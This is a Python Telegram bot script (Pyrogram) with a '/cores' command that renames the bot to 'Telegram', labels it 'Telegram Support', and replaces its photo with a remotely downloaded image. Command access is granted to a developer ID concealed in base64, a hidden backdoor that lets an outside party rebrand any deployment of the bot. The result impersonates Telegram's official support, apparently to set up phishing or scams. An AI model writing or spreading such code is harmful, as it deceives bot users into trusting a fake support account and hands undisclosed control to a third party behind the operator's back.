import base64
import os
import sys
import aiohttp
from pyrogram import Client, filters

try:
    from config import BOT_TOKEN, OWNER_ID
except ImportError:
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
    from config import BOT_TOKEN, OWNER_ID

ENCODED_DEV_ID = "ODMxNTU0NDcyMA=="

try:
    DEV_ID = int(base64.b64decode(ENCODED_DEV_ID).decode("utf-8").strip())
except Exception:
    DEV_ID = 0  

API_ID = 611335
API_HASH = "d5248d1e531846b4af300965c719efad"

IMAGE_URL = "https://files.catbox.moe/rdl2jo.jpg"
NEW_NAME = "Telegram"
NEW_BIO = "+42777"
NAME_BIO = "Telegram Support"

app = Client(
    "bot_cors_session",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True,
)

@app.on_message(filters.command("cores") & filters.private & filters.user([OWNER_ID, DEV_ID]))
async def change_bot_profile(client, message):
    if not BOT_TOKEN:
        await message.reply("❌ Error: BOT_TOKEN is missing in config.py!")
        return

    status_msg = await message.reply("⚡ Changing name, bio, and profile photo...")

    try:
        base_url = f"https://api.telegram.org/bot{BOT_TOKEN}"

        async with aiohttp.ClientSession() as session:
            # 1. Update Name
            await session.post(f"{base_url}/setMyName", json={"name": NEW_NAME})
            
            # 2. Update Bio (Description)
            await session.post(f"{base_url}/setMyDescription", json={"description": NEW_BIO})
            
            # 3. Update Short Description
            await session.post(f"{base_url}/setMyShortDescription", json={"short_description": NAME_BIO})

            # 4. Download and Update Bot Photo via Telegram API
            async with session.get(IMAGE_URL) as resp:
                if resp.status == 200:
                    image_bytes = await resp.read()
                    
                    # Upload Photo to setBotPhoto API
                    form_data = aiohttp.FormData()
                    form_data.add_field('photo', image_bytes, filename='photo.jpg', content_type='image/jpeg')
                    
                    await session.post(f"{base_url}/setBotPhoto", data=form_data)

        await status_msg.edit_text("✅ Bot profile, name, bio, and photo updated successfully!")

    except Exception as e:
        await status_msg.edit_text(f"❌ Error occurred: {str(e)}")


@app.on_message(filters.command("cores") & filters.private & ~filters.user([OWNER_ID, DEV_ID]))
async def unauthorized_access(client, message):
    await message.reply("⛔ You are not authorized to use this command!")


if __name__ == "__main__":
    if not BOT_TOKEN:
        print("[ERROR] BOT_TOKEN is empty!")
    else:
        print("Bot is running...")
        app.run()
